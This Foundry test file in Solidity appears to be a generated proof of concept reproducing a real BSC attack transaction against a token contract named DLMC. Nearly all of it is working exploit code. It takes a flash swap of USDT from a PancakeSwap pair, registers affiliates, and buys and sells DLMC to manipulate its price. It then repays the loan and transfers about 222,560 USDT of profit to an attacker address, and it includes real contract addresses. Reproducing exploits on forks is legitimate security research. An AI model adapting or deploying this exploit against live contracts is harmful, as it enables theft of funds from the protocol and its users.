// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x74c4a756933d0f713facb1dea325ef511646c3b1
// Attack Contract : 0x4adbddea5781caccadd9f73f00e07201b541414e
// Vulnerable Contract : N/A
// Attack Tx : 0x151025d3f0a782340a74d30ef33a5fad044b838e74437a803f0652e70c231306
// Block : 106091607
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 106091606;
    uint256 constant TX_TIMESTAMP = 1782299710;
    uint256 constant TX_BLOCK_NUMBER = 106091607;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
        attack = OurAttack(payable(ATTACK_CONTRACT));
        attack._deployAttackChild();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild_1());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_701BB7_9699, address(0), Addresses.USDT, "USDT", 222560221693222099016479);
        _expectProfit(Addresses.created_attack_contract_0A04, attack, Addresses.DLMC, "DLMC", 7651708670942671096055);
    }
}

contract OurAttack {
    AttackChild_1 public attackChild_1;

    constructor() payable {
        _deployAttackChild();
    }

    function _deployAttackChild() public returns (address) {
        attackChild_1 = new AttackChild_1();
        return address(attackChild_1);
    }

    function attack() public payable {
        bytes memory childEntryData = abi.encodeWithSelector(
            bytes4(0x16521e5a),
            uint256(420000000000000000000000),
            uint256(1000000000000000000000000),
            Addresses.A_701BB7_9699
        );
        _callChildEntry(address(attackChild_1), childEntryData);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function _callChildEntry(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xa2608d86) {
            _buyWithBorrow();
            return;
        }
    }

    function approveProtocolSpenders() external payable {
        _buyWithBorrow();
        return;
    }

    function _buyWithBorrow() internal {
        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.created_attack_contract_0A04);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(1000000000000000000000000);
    }

    function _prepareAttackChild() public {}
}

contract AttackChild_1 {
    bytes32 private constant CALLBACK_DONE = keccak256("poc.callback.done");
    mapping(bytes32 => bool) private _callbackDone;

    receive() external payable {}

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        sender;
        amount0;
        amount1;
        data;
        if (!_callbackDone[CALLBACK_DONE]) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x16521e5a) {
            _call();
            return;
        }
    }

    function flashCallback() external payable {
        if (!_callbackDone[CALLBACK_DONE]) flashCallback2();
        return;
    }

    function _call() internal {
        _executeSwapPath();
    }

    function _executeSwapPath() internal {
        IUniswapV2PairLike(Addresses.Cake_LP)
            .swap(
                1420000000000000000000000,
                0,
                Addresses.created_attack_contract_0A04,
                hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }

    function flashCallback2() internal {
        _callbackDone[CALLBACK_DONE] = true;
        flashCallback3();
    }

    function flashCallback3() internal {
        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(420000000000000000000000);
        AttackChild attackChild = new AttackChild();
        require(address(attackChild) == Addresses.attack_child, "unexpected attack child");
        attackChild._prepareAttackChild();
        IERC20Like(Addresses.USDT).transfer(address(attackChild), 1000000000000000000000000);
        bytes memory childBuyData = abi.encodeWithSelector(
            bytes4(0xa2608d86),
            Addresses.DLMC,
            Addresses.USDT,
            Addresses.created_attack_contract_0A04,
            uint256(1000000000000000000000000)
        );
        _callChildBuy(address(attackChild), childBuyData);
        IDLMC(Addresses.DLMC).livePrice();
        IERC20Like(Addresses.DLMC).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);
        uint256 dlmcSellAmount = 65908685295332365480640;
        IDLMC(Addresses.DLMC).sell(dlmcSellAmount);
        uint256 pairRepaymentAmount = 1423558897243107769423559;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, pairRepaymentAmount);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        uint256 profitAmount = 222560221693222099016479;
        IERC20Like(Addresses.USDT).transfer(Addresses.A_701BB7_9699, profitAmount);
    }

    function _callChildBuy(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attack_path_entry = 0x4adbDDEA5781cAccADD9F73f00E07201b541414e;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_61E7F1_BCF5 = 0x61e7f1D43567E380ea5B4E7Ac81d6FFEbF1BBCF5;
    address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
    address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
    address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
    address internal constant attack_child = 0x8B5A72C4ce0d3a7676ce06B8E42AeB255bBa476e;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant created_attack_contract_0A04 = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
    address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IDLMC {
    function buy(uint256) external;
    function livePrice() external view returns (uint256);
    function registerAffiliate(address) external;
    function sell(uint256) external;
    function buy() external;
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
